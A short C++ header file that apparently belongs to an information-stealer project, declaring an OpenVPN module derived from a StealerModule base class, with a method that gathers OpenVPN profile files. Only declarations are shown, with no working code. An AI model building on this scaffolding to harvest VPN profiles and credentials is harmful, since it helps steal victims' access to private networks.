//
// Created by .1qxz on 08.06.2024.
//

#ifndef STEALER_OPENVPN_H
#define STEALER_OPENVPN_H


#include "../../../StealerModule.h"

class OpenVPN : public StealerModule {
public:
    void execute(fs::path &root) override;
private:
    static std::vector<fs::path> openvpnProfiles();
};


#endif //STEALER_OPENVPN_H
